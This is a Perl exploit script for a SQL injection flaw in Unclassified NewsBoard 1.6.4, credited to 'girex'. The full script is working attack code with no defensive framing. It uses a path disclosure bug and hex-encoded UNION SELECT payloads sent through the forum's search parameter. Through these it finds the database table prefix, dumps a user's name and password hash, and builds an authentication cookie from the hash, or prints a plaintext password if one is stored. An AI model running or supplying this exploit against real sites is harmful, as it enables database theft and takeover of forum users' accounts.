#!/usr/bin/perl
# Unclassified NewsBoard 1.6.4 Remote SQL Injection Exploit
# Coded by girex

use LWP::UserAgent;
use HTTP::Cookies;

if(not defined $ARGV[0])
{
	print "\nusage: perl $0 <host> <path>\n";
	print "example: perl $0 localhost /unb/\n\n";
	exit;
} 

my $lwp = new LWP::UserAgent;
my $cookie_jar =  new HTTP::Cookies;

$lwp->cookie_jar($cookie_jar);
$lwp->default_header('Accept-Language: en-us,en;q=0.5');
$lwp->agent('User-Agent: Mozilla/5.0 (X11; U; Linux; it; rv:1.9.0.10) Firefox/3.0.10');


my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
   $target .=  $ARGV[1] unless not defined $ARGV[1];
   $target .= '/' unless $target =~ /\/$/;

banner();
my $id = '1';					# change if need
my $default_prefix = 'unb1';			# change if need
my $abs_path = get_abs_path();  		# using path disclosure bug
my $cookie_prefix = get_cookie_prefix();	# getting cookie prefix and session

print "[+] Path disclosure: $abs_path\n" if defined $abs_path;

$injection = "-1) AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,table_name,".
	     "12,13,14,15,16,17,18,19 FROM information_schema.tables WHERE table_name LIKE '%_GroupMembers' LIMIT 0,1#";

$table_name = make_inj($injection); 

if(defined $table_name and $table_name =~ /(\w+)_GroupMembers/)
{ 
	$prefix = $1;
	print "[+] Found table prefix via information schema: ${prefix}_\n\n";
}
else
{
	$prefix = $deafult_prefix;
}	

# Change this query if need
$injection = "-1) AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,concat(Name,0x3a,Password),".
	     "12,13,14,15,16,17,18,19 FROM ${prefix}_Users WHERE ID=${id} OR 1 LIMIT 0,1#";

$login = make_inj($injection);

if(defined $login)
{
	($username, $hash) = split(':', $login,2);
	print "[+] Username: $username\n[+] Hash: $hash\n\n";

	if(length($hash) == 32)
	{
		$cookie = "UnbUser-${cookie_prefix}=${id}+${hash}";
		print "[+] Password is hashed in md5 use this cookie to authenticate:\n";
		print "[+] Cookie: $cookie\n\n";
	}
	elsif(length($hash) == 34)
	{
		print "[-] Hash retrieved is NOT a md5, so can't retrieve cookie to authenticate.\n";
		print "[-] See the source to know how to bruteforce it\n\n";
	}
	else
	{
		$password = $1 if $hash =~ /\{(.+)\}/;
		print "[+] Password is in plain-text use $username and $password to login!\n\n";
	}
}
else
{
	print "[-] Unable to retrieve user's hash, probably wrong prefix\n\n";
}

sub get_abs_path()
{
	my $res = $lwp->get($target.'extra/import/import_wbb1.php');
	
	if($res->is_error)
	{
		return undef;
	}

	if($res->content =~ /in <b>(.*)extra\/import\/import_wbb1.php<\/b> on line/)
	{
		return $1;
	}

	return $undef;
}

sub get_cookie_prefix()
{
	my $res = $lwp->get($target.'forum.php');

	if($res->is_error)
	{
		print "[-] Unable to request ${target}forum.php\n";
		print "[-] ". $res->status_line."\n\n";
		exit;
	}
	
	if($res->as_string =~ /Set-Cookie: unb(\d+)sess=(\w{32})/)
	{
		$v = $1;
		$val = $2;
	}

	return "unb${v}";
}

sub make_inj()
{
	my $inj = hex_str(shift);
	my $final_inj = "1')AND(1=2))UNION/**/SELECT/**/$inj,-1111,-1111%23";

	my $res = $lwp->get($target."forum.php?req=search&Query=${final_inj}&ResultView=2&InMessage=1&Forum=0&set_lang=en");

	if($res->is_error)
	{
		print "[-] ". $res->status_line . "\n\n";
		exit;
	}

	if($res->content =~ /<small>Subject:<\/small> <b>(.+)<\/b>/)
	{
		return $1;
	}

	open(DEBUG, '>', 'debug.htm');
	print DEBUG $res->content;
	close(DEBUG);

	return undef;
}

sub hex_str()
{
	return '0x'. unpack("H*", shift);
}

sub banner()
{
	print "\n[+] Unclassified NewsBoard 1.6.4 Remote SQL Injection Exploit\n";
	print "[+] Coded by girex\n\n";
}